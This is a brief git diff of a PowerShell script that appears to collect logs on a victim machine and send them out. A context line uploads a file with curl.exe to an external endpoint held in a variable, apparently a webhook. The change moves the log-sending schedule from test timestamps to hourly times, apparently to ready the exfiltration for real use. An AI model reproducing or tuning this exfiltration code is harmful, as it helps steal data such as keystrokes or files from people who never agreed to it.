@@ -30,10 +30,10 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $dc}
 
 # times logs will be sent [keep in military time]
 $logTimes = @(
-    '00:36:00',
-    '00:36:15',
-    '00:36:30',
-    '00:36:45',
+    '00:00:00',
+    '01:00:00',
+    '02:00:00',
+    '03:00:00',
     '04:00:00',
     '05:00:00',
     '06:00:00',
